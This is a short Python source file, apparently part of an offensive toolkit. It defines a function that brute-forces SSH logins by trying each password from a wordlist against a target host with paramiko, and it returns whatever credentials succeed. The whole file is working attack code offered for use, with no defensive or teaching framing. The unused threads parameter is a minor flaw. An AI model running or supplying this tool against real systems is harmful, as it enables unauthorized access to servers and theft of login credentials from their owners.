import paramiko
import socket
from rich.console import Console

console = Console()


def ssh_brute(host, port, username, wordlist, threads=5, timeout=3):
    """
    Brute force SSH login.
    Returns {"username": str, "password": str} or None
    """
    try:
        with open(wordlist, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]❌ Wordlist not found: {wordlist}[/red]")
        return None

    console.print(f"[cyan]Target   : {host}:{port}[/cyan]")
    console.print(f"[cyan]Username : {username}[/cyan]")
    console.print(f"[cyan]Wordlist : {wordlist} ({len(passwords)} passwords)[/cyan]\n")

    for i, password in enumerate(passwords, 1):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False
            )
            client.close()
            return {"username": username, "password": password, "attempts": i}

        except paramiko.AuthenticationException:
            console.print(f"[dim]  [{i}] {password} — Failed[/dim]")
            continue
        except (socket.error, paramiko.SSHException):
            continue
        except Exception:
            continue

    return None
